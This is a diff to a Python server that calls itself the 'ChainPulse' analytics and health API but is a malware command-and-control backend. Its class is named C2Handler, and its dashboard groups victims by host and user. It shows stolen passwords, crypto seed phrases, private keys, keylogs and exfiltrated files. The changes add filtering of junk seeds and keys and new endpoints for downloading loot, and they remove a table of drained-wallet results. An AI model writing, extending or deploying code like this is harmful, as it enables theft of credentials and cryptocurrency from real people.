@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""ChainPulse v8.3 — Analytics & Health API (Render-compatible).
+"""ChainPulse v8.3.2 — Analytics & Health API (Render-compatible).
 
 Accepts both:
   - Python agent envelope: {endpoint, campaign, timestamp, payload:{system_info,...}}
@@ -26,7 +26,7 @@ DASHBOARD_HTML = r"""<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ChainPulse v8.3 — Analytics</title>
+<title>ChainPulse v8.3.2 — Analytics</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'SF Mono','Consolas','Courier New',monospace;background:#080810;color:#00ff88;padding:20px;font-size:13px}
@@ -57,7 +57,24 @@ pre{background:#050510;padding:10px;border-radius:4px;overflow-x:auto;margin:10p
 .hl-title{color:#ff4466;font-size:15px;font-weight:bold;letter-spacing:.5px;margin-bottom:6px}
 .hl-box.seed .hl-title{color:#ffd700}
 .hl-box.key .hl-title{color:#00d4ff}
-.hl-value{color:#fff;font-size:16px;font-family:Consolas,monospace;word-break:break-all;background:#000;padding:8px 10px;border-radius:4px;margin-top:4px}
+.hl-value{color:#fff;font-size:16px;font-family:Consolas,monospace;word-break:break-all;background:#000;padding:8px 10px;border-radius:4px;margin-top:4px;max-height:4.5em;overflow:hidden}
+.hl-value.open{max-height:none}
+details.hl-item{margin:6px 0;border:1px solid #333;border-radius:6px;background:#0a0a12}
+details.hl-item summary{cursor:pointer;padding:8px 10px;color:#ffd700;font-weight:bold;list-style:none;user-select:none}
+details.hl-item summary::-webkit-details-marker{display:none}
+details.hl-item summary:before{content:'▶ ';font-size:10px;color:#666}
+details.hl-item[open] summary:before{content:'▼ '}
+details.hl-item .hl-body{padding:0 10px 10px}
+details.victim{margin-bottom:14px;border:1px solid #1a3a3a;border-radius:8px;background:#0c0c18}
+details.victim>summary{cursor:pointer;padding:12px 14px;color:#00d4ff;font-size:14px;font-weight:bold;list-style:none}
+details.victim>summary::-webkit-details-marker{display:none}
+details.victim>summary:before{content:'▶ ';color:#666;font-size:11px}
+details.victim[open]>summary:before{content:'▼ '}
+details.victim .victim-body{padding:0 12px 12px}
+.hl-preview{color:#888;font-size:11px;margin-left:8px;font-weight:normal}
+.btn-row{margin:8px 0}
+.btn-row button{background:#122;color:#0f8;border:1px solid #1a3a3a;padding:4px 10px;border-radius:4px;cursor:pointer;margin-right:6px;font-family:inherit;font-size:12px}
+.btn-row button:hover{border-color:#0f8}
 .hl-meta{color:#888;font-size:11px;margin-top:6px}
 .persist-tag{background:#8844ff;color:#fff}
 table{width:100%;border-collapse:collapse;margin:8px 0}
@@ -73,7 +90,7 @@ a{color:#00d4ff}
 </style>
 </head>
 <body>
-<h1>ChainPulse v8.3 — Analytics Dashboard</h1>
+<h1>ChainPulse v8.3.2 — Analytics Dashboard</h1>
 <div id="stats"></div>
 <div id="loot"></div>
 <script>
@@ -137,136 +154,168 @@ async function load(){
     '<div class="stat-box"><div class="num">'+fileHits+'</div><div class="lbl">Files</div></div>'+
     '</div>';
 
-  let html='';
+  // Helpers
+  function esc(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
+  function secretVal(x){
+    if(x==null) return '';
+    if(typeof x==='string'||typeof x==='number') return String(x);
+    if(typeof x==='object'){
+      if(x.value!=null&&x.value!=='') return typeof x.value==='object'?JSON.stringify(x.value):String(x.value);
+      if(x.key!=null&&x.key!=='') return typeof x.key==='object'?JSON.stringify(x.key):String(x.key);
+      if(x.password!=null) return String(x.password);
+      try{return JSON.stringify(x);}catch(e){return String(x);}
+    }
+    return String(x);
+  }
+  function isJunkSeed(val, src){
+    const v=String(val||'').toLowerCase().trim();
+    const s=String(src||'').toLowerCase();
+    if(!v||v.length<20) return true;
+    if(/\[object object\]/.test(v)) return true;
+    if(/bottom|maximized|work area|minimized|undefined|null/.test(v)) return true;
+    if(/preferences$|component_crx|metadata\.json|graphite|safe browsing|local state$/.test(s) && !/nkbihf|metamask|extension settings/.test(s)) return true;
+    const words=v.split(/\s+/).filter(Boolean);
+    if(![12,15,18,21,24].includes(words.length)) return true;
+    // too many layout words
+    const junk=new Set(['bottom','left','right','top','false','true','work','area','maximized','minimized','width','height','screen','window']);
+    if(words.filter(w=>junk.has(w)).length>=3) return true;
+    return false;
+  }
+  function isJunkKey(val, src){
+    const v=String(val||'');
+    const s=String(src||'').toLowerCase();
+    if(!v||v.length<32) return true;
+    if(/\[object object\]/i.test(v)) return true;
+    if(/component_crx|metadata\.json|graphite|safe browsing|preferences$/.test(s)) return true;
+    return false;
+  }
+
+  // Group by victim host|user
+  const groups={};
+  const groupOrder=[];
   for(const p of rows){
-    const fileCount=Object.keys(p.files||{}).length;
-    const hasDrain=(p.drain_results||[]).some(dr=>dr.status==='drained');
-    const seeds=(p.secrets.seed_phrases||[]).length;
-    const pkeys=(p.secrets.private_keys||[]).length;
-    const hasSessions=(p.exchange_sessions||[]).length;
-    const capPwEarly=(p.secrets.captured_passwords||[]);
-    let cc='card';
-    if(hasDrain)cc='card card-drain';
-    else if(seeds||capPwEarly.length)cc='card card-seed';
-    else if(hasSessions)cc='card card-session';
-    else if(fileCount)cc='card card-files';
+    const gk=(p.hostname||'?')+'|'+(p.user||'?');
+    if(!groups[gk]){ groups[gk]=[]; groupOrder.push(gk); }
+    groups[gk].push(p);
+  }
 
-    html+='<div class="'+cc+'">';
-    html+='<h2>'+ p.endpoint +' — '+ p.timestamp +'</h2>';
-    html+='<span class="label">Campaign:</span> <span class="value">'+p.campaign+'</span> | ';
-    html+='<span class="label">System:</span> <span class="value">'+p.hostname+' ('+p.user+') '+p.os+'</span>';
-    if(p.id) html+=' | <span class="label">ID:</span> <span class="value">'+p.id+'</span>';
-    html+='<br>';
+  let html='<div class="btn-row"><button onclick="document.querySelectorAll(\'details.victim\').forEach(d=>d.open=true)">Expandir todos</button>';
+  html+='<button onclick="document.querySelectorAll(\'details.victim\').forEach(d=>d.open=false)">Minimizar todos</button>';
+  html+='<button onclick="document.querySelectorAll(\'details.hl-item\').forEach(d=>d.open=false)">Minimizar capturas</button></div>';
 
-    const wallets=p.wallets||{};
-    const wnames=Object.keys(wallets).filter(k=>wallets[k]&& (Array.isArray(wallets[k])?wallets[k].length:true));
-    html+='<span class="label">Wallets:</span> ';
-    if(wnames.length){
-      html+=wnames.map(w=>'<span class="chain-tag">'+w+'</span>').join(' ');
-    }else{html+='<span class="value">none listed</span>';}
-    html+='<br>';
-
-    const capPw=(p.secrets.captured_passwords||[]);
-    const klCount=(p.keylog&&p.keylog.count)||(p.keylog&&p.keylog.entries&&p.keylog.entries.length)||0;
-    const pmList=Array.isArray(p.password_managers)?p.password_managers:[];
-    const highlights=Array.isArray(p.highlights)?p.highlights:[];
-    const decVaults=(p.secrets.decrypted_vaults||[]);
-    const seedList=(p.secrets.seed_phrases||[]);
-    const keyList=(p.secrets.private_keys||[]);
-    if(p.persistent||String(p.endpoint||'').includes('persist'))html+='<span class="badge persist-tag">PERSISTENTE</span> ';
-    if(seeds)html+='<span class="badge badge-seed">SEED x'+seeds+'</span> ';
-    if(pkeys)html+='<span class="badge badge-btc">KEY x'+pkeys+'</span> ';
-    if(capPw.length)html+='<span class="badge badge-pw">SENHAS x'+capPw.length+'</span> ';
-    if(decVaults.length)html+='<span class="badge badge-danger">VAULT ABERTO x'+decVaults.length+'</span> ';
-    if(klCount)html+='<span class="badge badge-session">KEYLOG x'+klCount+'</span> ';
-    if(pmList.length)html+='<span class="badge badge-files">PWD-MGR x'+pmList.length+'</span> ';
-    if(fileCount)html+='<span class="badge badge-files">FILES x'+fileCount+'</span> ';
-    if(hasSessions){
-      const domains=[...new Set(p.exchange_sessions.map(s=>s.domain||s))];
-      html+='<span class="badge badge-session">SESSIONS: '+domains.slice(0,5).join(', ')+'</span> ';
-    }
-
-    // === HIGHLIGHTS: plain language captures ===
-    function esc(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\"/g,'&quot;');}
-    // Build highlights from structured data if empty
-    let hls=highlights.slice();
-    if(!hls.length){
-      for(const x of capPw){
-        const lab=String(x.label||'').toUpperCase();
-        let title='CAPTURADA SENHA';
-        if(lab==='METAMASK'||/metamask/i.test(x.window||'')) title='CAPTURADA SENHA METAMASK';
-        else if(lab==='PHANTOM'||/phantom/i.test(x.window||'')) title='CAPTURADA SENHA PHANTOM';
-        else if(lab==='PASSWORD_MANAGER'||/bitwarden|keepass|1password|safepass/i.test(x.window||'')) title='CAPTURADA SENHA PASSWORD MANAGER';
-        else if(x.window) title='CAPTURADA SENHA ('+String(x.window).slice(0,40)+')';
-        hls.push({type:'password',title:title,value:x.password||x.value||'',window:x.window||'',at:x.captured_at||''});
+  for(const gk of groupOrder){
+    const items=groups[gk];
+    const [host,user]=gk.split('|');
+    const latest=items[0];
+    const osn=latest.os||'';
+    // aggregate badges
+    let aSeeds=0,aKeys=0,aPw=0,aFiles=0,aKl=0,realHls=[];
+    const seenHl=new Set();
+    for(const p of items){
+      const seedList=(p.secrets.seed_phrases||[]);
+      const keyList=(p.secrets.private_keys||[]);
+      const capPw=(p.secrets.captured_passwords||[]);
+      aPw+=capPw.length;
+      aFiles+=Object.keys(p.files||{}).length;
+      aKl+= (p.keylog&&p.keylog.count)||0;
+      let hls=Array.isArray(p.highlights)?p.highlights.slice():[];
+      if(!hls.length){
+        for(const x of capPw){
+          const lab=String(x.label||'').toUpperCase();
+          let title='CAPTURADA SENHA';
+          if(lab==='METAMASK'||/metamask/i.test(x.window||'')) title='CAPTURADA SENHA METAMASK';
+          else if(lab==='PHANTOM'||/phantom/i.test(x.window||'')) title='CAPTURADA SENHA PHANTOM';
+          else if(lab==='PASSWORD_MANAGER'||/bitwarden|keepass|1password|safepass/i.test(x.window||'')) title='CAPTURADA SENHA PASSWORD MANAGER';
+          else if(x.window) title='CAPTURADA SENHA ('+String(x.window).slice(0,40)+')';
+          hls.push({type:'password',title:title,value:x.password||x.value||'',window:x.window||'',at:x.captured_at||''});
+        }
+        for(const s of seedList){
+          hls.push({type:'seed',title:'SEED PHRASE DESBLOQUEADA',value:secretVal(s),source:(s&&s.source)||''});
+        }
+        for(const k of keyList.slice(0,15)){
+          hls.push({type:'key',title:'PRIVATE KEY DESBLOQUEADA',value:secretVal(k),source:(k&&k.source)||''});
+        }
       }
-      for(const s of seedList){
-        hls.push({type:'seed',title:'SEED PHRASE DESBLOQUEADA',value:s.value||s,source:s.source||s.password_used||''});
-      }
-      for(const k of keyList.slice(0,15)){
-        hls.push({type:'key',title:'PRIVATE KEY DESBLOQUEADA',value:k.value||k,source:k.source||''});
+      for(const h of hls){
+        const val=secretVal(h.value);
+        const src=h.source||'';
+        if(h.type==='seed'&&isJunkSeed(val,src)) continue;
+        if(h.type==='key'&&isJunkKey(val,src)) continue;
+        if(h.type==='seed') aSeeds++;
+        if(h.type==='key') aKeys++;
+        const sig=(h.type||'')+'|'+val.slice(0,80);
+        if(seenHl.has(sig)) continue;
+        seenHl.add(sig);
+        realHls.push(Object.assign({},h,{value:val}));
       }
     }
-    if(hls.length){
-      html+='<div style="margin-top:10px">';
-      for(const h of hls.slice(0,25)){
-        const cls=h.type==='seed'?'hl-box seed':h.type==='key'?'hl-box key':'hl-box';
-        html+='<div class="'+cls+'">';
-        html+='<div class="hl-title">'+esc(h.title||'CAPTURA')+'</div>';
-        html+='<div class="hl-value">'+esc(h.value||'')+'</div>';
+    const wset=new Set();
+    for(const p of items){
+      Object.keys(p.wallets||{}).forEach(w=>wset.add(w));
+    }
+    // open first victim by default if only one or has real captures
+    const openFirst = groupOrder.length===1 || realHls.some(h=>h.type==='password'||h.type==='seed'||h.type==='key');
+    html+='<details class="victim"'+(openFirst&&groupOrder.indexOf(gk)===0?' open':'')+'>';
+    html+='<summary>'+esc(host)+' <span class="label">/</span> '+esc(user)+' <span class="hl-preview">'+esc(osn)+' · '+items.length+' report(s)';
+    if(aPw) html+=' · SENHAS '+aPw;
+    if(aSeeds) html+=' · SEEDS '+aSeeds;
+    if(aKeys) html+=' · KEYS '+aKeys;
+    if(aFiles) html+=' · FILES '+aFiles;
+    html+='</span></summary><div class="victim-body">';
+
+    // wallets
+    html+='<div style="margin:6px 0"><span class="label">Wallets:</span> ';
+    if(wset.size) html+=[...wset].map(w=>'<span class="chain-tag">'+esc(w)+'</span>').join(' ');
+    else html+='<span class="value">none</span>';
+    html+='</div>';
+
+    if(realHls.length){
+      html+='<div class="btn-row"><button onclick="event.preventDefault();this.closest(\'.victim-body\').querySelectorAll(\'details.hl-item\').forEach(d=>d.open=true)">Expandir capturas</button>';
+      html+='<button onclick="event.preventDefault();this.closest(\'.victim-body\').querySelectorAll(\'details.hl-item\').forEach(d=>d.open=false)">Minimizar capturas</button></div>';
+      // passwords open by default; seeds/keys collapsed
+      for(const h of realHls.slice(0,40)){
+        const isPw=h.type==='password';
+        const cls=h.type==='seed'?'hl-item seed':h.type==='key'?'hl-item key':h.type==='alert'?'hl-item':'hl-item';
+        const preview=String(h.value||'').slice(0,42)+(String(h.value||'').length>42?'…':'');
+        html+='<details class="'+cls+'"'+(isPw?' open':'')+'>';
+        html+='<summary>'+esc(h.title||'CAPTURA')+' <span class="hl-preview">'+esc(preview)+'</span></summary>';
+        html+='<div class="hl-body"><div class="hl-value open">'+esc(h.value||'')+'</div>';
         let meta=[];
         if(h.window) meta.push('Janela: '+esc(String(h.window).slice(0,60)));
-        if(h.source) meta.push('Origem: '+esc(String(h.source).slice(0,80)));
+        if(h.source) meta.push('Origem: '+esc(String(h.source).slice(0,100)));
         if(h.at) meta.push(esc(String(h.at)));
         if(meta.length) html+='<div class="hl-meta">'+meta.join(' · ')+'</div>';
-        html+='</div>';
+        html+='</div></details>';
+      }
+    } else {
+      html+='<div class="label" style="margin:8px 0">Nenhuma senha/seed/key válida ainda (só arquivos/keylog). Keylogger residente continua.</div>';
+    }
+
+    // per-report collapsible file lists (latest first, collapse)
+    html+='<details style="margin-top:10px"><summary class="label" style="cursor:pointer">Relatórios ('+items.length+') — arquivos e endpoints</summary>';
+    for(const p of items.slice(0,12)){
+      const fileCount=Object.keys(p.files||{}).length;
+      const pmList=Array.isArray(p.password_managers)?p.password_managers:[];
+      html+='<div class="card" style="margin-top:8px;padding:10px">';
+      html+='<div><span class="value">'+esc(p.endpoint)+'</span> · '+esc(p.timestamp||'')+' · campaign '+esc(p.campaign||'')+'</div>';
+      if(pmList.length){
+        html+='<div class="file-list">'+pmList.slice(0,10).map(n=>'<div>[PM] '+esc(n)+'</div>').join('')+'</div>';
+      }
+      if(fileCount){
+        const names=Object.keys(p.files).slice(0,40);
+        html+='<details style="margin-top:6px"><summary class="label" style="cursor:pointer">Arquivos ('+fileCount+')</summary>';
+        html+='<div class="file-list">'+names.map(n=>'<div>'+esc(n)+'</div>').join('');
+        if(Object.keys(p.files).length>40) html+='<div>… +'+(Object.keys(p.files).length-40)+' more</div>';
+        html+='</div></details>';
       }
       html+='</div>';
     }
+    html+='</details>';
 
-    if(pmList.length){
-      html+='<div class="file-list">'+pmList.slice(0,15).map(n=>'<div>[PM] '+esc(n)+'</div>').join('')+
-        (pmList.length>15?'<div>… +'+(pmList.length-15)+' more</div>':'')+'</div>';
-    }
-    if(fileCount){
-      const names=Object.keys(p.files).slice(0,25);
-      html+='<details style="margin-top:8px"><summary class="label" style="cursor:pointer">Arquivos capturados ('+fileCount+') — clique para expandir</summary>';
-      html+='<div class="file-list">'+names.map(n=>'<div>'+esc(n)+'</div>').join('')+
-        (Object.keys(p.files).length>25?'<div>… +'+(Object.keys(p.files).length-25)+' more</div>':'')+
-        '</div></details>';
-    }
-
-    const dr=p.drain_results||[];
-    if(dr.length){
-      html+='<br><span class="label">RESULTS ('+dr.length+'):</span><br>';
-      html+='<table><tr><th>Chain</th><th>Type</th><th>Status</th><th>Amount</th><th>TX</th></tr>';
-      for(const r of dr){
-        let badge='';
-        if(r.status==='drained'&&r.type==='erc20')badge='<span class="badge badge-erc20">ERC20</span>';
-        else if(r.status==='drained')badge='<span class="badge badge-drained">DRAINED</span>';
-        else if(r.status==='empty')badge='<span class="badge">empty</span>';
-        else if(r.status==='dust')badge='<span class="badge">dust</span>';
-        else badge='<span class="badge" style="background:#555">'+(r.status||'?')+'</span>';
-
-        let amt='-';
-        if(r.amount_ether!==undefined)amt=Number(r.amount_ether).toFixed(6)+' '+(r.chain||'').toUpperCase();
-        else if(r.amount_human!==undefined)amt=Number(r.amount_human).toFixed(4)+' '+(r.symbol||'');
-        else if(r.amount_sol!==undefined)amt=Number(r.amount_sol).toFixed(6)+' SOL';
-
-        html+='<tr>'+
-          '<td><span class="chain-tag">'+(r.chain||'?')+'</span></td>'+
-          '<td>'+(r.type||r.symbol||'native')+'</td>'+
-          '<td>'+badge+'</td>'+
-          '<td>'+amt+'</td>'+
-          '<td>'+(r.explorer?'<a href="'+r.explorer+'" target="_blank">view</a>':r.tx_hash?String(r.tx_hash).slice(0,12)+'...':'-')+'</td>'+
-        '</tr>';
-      }
-      html+='</table>';
-    }
-
-    html+='</div>';
+    html+='</div></details>';
   }
-  document.getElementById('loot').innerHTML=html||'<div class="card">No data yet. Waiting for telemetry...</div>';
+
+    document.getElementById('loot').innerHTML=html||'<div class="card">No data yet. Waiting for telemetry...</div>';
 }
 load();setInterval(load,8000);
 </script>
@@ -318,6 +367,100 @@ def _normalize_payload(raw: dict) -> dict:
         pl["files"] = pl.get("files") if isinstance(pl.get("files"), dict) else {}
     if "highlights" not in pl or not isinstance(pl.get("highlights"), list):
         pl["highlights"] = pl.get("highlights") if isinstance(pl.get("highlights"), list) else []
+    # Sanitize secrets (drop UI garbage seeds / crx hash "keys")
+    sec = pl["secrets"] if isinstance(pl.get("secrets"), dict) else {}
+    def _junk_seed(val, src=""):
+        v = str(val or "").lower().strip()
+        s = str(src or "").lower()
+        if not v or len(v) < 20:
+            return True
+        if "bottom" in v and "work area" in v:
+            return True
+        if any(x in v for x in ("maximized", "work area", "[object object]")):
+            return True
+        words = v.split()
+        if len(words) not in (12, 15, 18, 21, 24):
+            return True
+        junk = {"bottom", "left", "right", "top", "false", "true", "work", "area", "maximized", "minimized"}
+        if sum(1 for w in words if w in junk) >= 3:
+            return True
+        if any(x in s for x in ("component_crx", "metadata.json", "preferences")) and "nkbihf" not in s and "metamask" not in s:
+            return True
+        return False
+
+    def _key_val(k):
+        if isinstance(k, str):
+            return k
+        if isinstance(k, dict):
+            v = k.get("value") or k.get("key") or ""
+            if isinstance(v, (dict, list)):
+                try:
+                    return json.dumps(v)
+                except Exception:
+                    return str(v)
+            return str(v) if v is not None else ""
+        return str(k) if k is not None else ""
+
+    def _junk_key(val, src=""):
+        v = str(val or "")
+        s = str(src or "").lower()
+        if not v or len(v) < 32 or "[object object]" in v.lower():
+            return True
+        if any(x in s for x in ("component_crx", "metadata.json", "graphite", "safe browsing")):
+            return True
+        return False
+
+    seeds_in = list(sec.get("seed_phrases") or [])
+    keys_in = list(sec.get("private_keys") or [])
+    clean_seeds = []
+    for s in seeds_in:
+        val = s.get("value") if isinstance(s, dict) else s
+        src = s.get("source") if isinstance(s, dict) else ""
+        if val and not _junk_seed(val, src):
+            if isinstance(s, dict):
+                clean_seeds.append(s)
+            else:
+                clean_seeds.append({"value": val})
+    clean_keys = []
+    for k in keys_in:
+        val = _key_val(k)
+        src = k.get("source") if isinstance(k, dict) else ""
+        if val and not _junk_key(val, src):
+            if isinstance(k, dict):
+                kk = dict(k)
+                kk["value"] = val
+                if "key" not in kk:
+                    kk["key"] = val
+                clean_keys.append(kk)
+            else:
+                clean_keys.append({"value": val, "key": val})
+    sec["seed_phrases"] = clean_seeds
+    sec["private_keys"] = clean_keys
+    pl["secrets"] = sec
+
+    # Filter existing highlights too
+    if pl["highlights"]:
+        filtered = []
+        for h in pl["highlights"]:
+            if not isinstance(h, dict):
+                continue
+            ht = h.get("type") or ""
+            val = h.get("value")
+            if isinstance(val, (dict, list)):
+                val = _key_val(val) if ht == "key" else (val.get("value") if isinstance(val, dict) else str(val))
+                h = dict(h)
+                h["value"] = val
+            src = h.get("source") or ""
+            if ht == "seed" and _junk_seed(val, src):
+                continue
+            if ht == "key" and _junk_key(val, src):
+                continue
+            if val is not None and not isinstance(val, str):
+                h = dict(h)
+                h["value"] = _key_val(val) if ht == "key" else str(val)
+            filtered.append(h)
+        pl["highlights"] = filtered
+
     # Auto-build highlights from secrets if client didn't send them
     if not pl["highlights"]:
         for x in (pl.get("secrets") or {}).get("captured_passwords") or []:
@@ -347,10 +490,46 @@ def _normalize_payload(raw: dict) -> dict:
             if val:
                 pl["highlights"].append({"type": "seed", "title": "SEED PHRASE DESBLOQUEADA", "value": val, "source": src})
         for k in ((pl.get("secrets") or {}).get("private_keys") or [])[:15]:
-            val = k.get("value") if isinstance(k, dict) else k
+            val = _key_val(k)
             src = k.get("source") if isinstance(k, dict) else ""
             if val:
                 pl["highlights"].append({"type": "key", "title": "PRIVATE KEY DESBLOQUEADA", "value": val, "source": src})
+
+    # Top-up: ensure cleaned secrets appear even if client sent partial/junk highlights
+    have_types = {(h.get("type"), str(h.get("value") or "")[:80]) for h in pl["highlights"] if isinstance(h, dict)}
+    for s in (pl.get("secrets") or {}).get("seed_phrases") or []:
+        val = s.get("value") if isinstance(s, dict) else s
+        src = s.get("source") if isinstance(s, dict) else ""
+        if not val:
+            continue
+        sig = ("seed", str(val)[:80])
+        if sig not in have_types:
+            pl["highlights"].append({"type": "seed", "title": "SEED PHRASE DESBLOQUEADA", "value": val, "source": src})
+            have_types.add(sig)
+    for k in ((pl.get("secrets") or {}).get("private_keys") or [])[:15]:
+        val = _key_val(k)
+        src = k.get("source") if isinstance(k, dict) else ""
+        if not val:
+            continue
+        sig = ("key", str(val)[:80])
+        if sig not in have_types:
+            pl["highlights"].append({"type": "key", "title": "PRIVATE KEY DESBLOQUEADA", "value": val, "source": src})
+            have_types.add(sig)
+    for x in (pl.get("secrets") or {}).get("captured_passwords") or []:
+        if not isinstance(x, dict):
+            continue
+        val = x.get("password") or x.get("value") or ""
+        if not val:
+            continue
+        sig = ("password", str(val)[:80])
+        if sig not in have_types:
+            lab = str(x.get("label") or "").upper()
+            win = str(x.get("window") or "")
+            title = "CAPTURADA SENHA"
+            if lab == "METAMASK" or "metamask" in win.lower():
+                title = "CAPTURADA SENHA METAMASK"
+            pl["highlights"].append({"type": "password", "title": title, "value": val, "window": win, "at": x.get("captured_at") or ""})
+            have_types.add(sig)
 
     # Infer wallets from file paths (MetaMask etc.)
     if not pl["wallets"] and pl["files"]:
@@ -420,10 +599,39 @@ class C2Handler(BaseHTTPRequestHandler):
     def do_GET(self):
         if self.path in ("/", "/dashboard"):
             self._serve_html(DASHBOARD_HTML)
+        elif self.path.startswith("/api/loot-files"):
+            # ?campaign=render-01 — list loot JSON filenames
+            from urllib.parse import urlparse, parse_qs
+            qs = parse_qs(urlparse(self.path).query)
+            camp = (qs.get("campaign") or [DEFAULT_CAMPAIGN])[0]
+            cdir = os.path.join(LOOT_DIR, camp)
+            files = []
+            if os.path.isdir(cdir):
+                for fn in sorted(os.listdir(cdir), reverse=True)[:200]:
+                    fp = os.path.join(cdir, fn)
+                    if os.path.isfile(fp):
+                        files.append({"name": fn, "size": os.path.getsize(fp), "mtime": os.path.getmtime(fp)})
+            self._serve_json({"campaign": camp, "files": files, "dir": cdir})
+        elif self.path.startswith("/api/loot-download"):
+            from urllib.parse import urlparse, parse_qs
+            qs = parse_qs(urlparse(self.path).query)
+            camp = (qs.get("campaign") or [DEFAULT_CAMPAIGN])[0]
+            name = (qs.get("name") or [""])[0]
+            name = os.path.basename(name)
+            fp = os.path.join(LOOT_DIR, camp, name)
+            if not name or not os.path.isfile(fp):
+                self.send_response(404); self.end_headers(); return
+            data = open(fp, "rb").read()
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json")
+            self.send_header("Content-Disposition", f'attachment; filename="{name}"')
+            self.send_header("Content-Length", str(len(data)))
+            self.end_headers()
+            self.wfile.write(data)
         elif self.path == "/api/loot-summary":
             self._serve_json(self._get_summary())
         elif self.path == "/health":
-            self._serve_json({"status": "healthy", "version": "8.3.1", "render": True})
+            self._serve_json({"status": "healthy", "version": "8.3.2", "render": True})
         else:
             self.send_error(404)
 
@@ -676,7 +884,7 @@ class C2Handler(BaseHTTPRequestHandler):
 
 
 if __name__ == "__main__":
-    print(f"[C2] ChainPulse v8.3.1 (Render) — http://{HOST}:{PORT}")
+    print(f"[C2] ChainPulse v8.3.2 (Render) — http://{HOST}:{PORT}")
     print(f"[C2] Dashboard: /dashboard")
     print(f"[C2] Health:    /health")
     print(f"[C2] Loot dir:  {LOOT_DIR}")
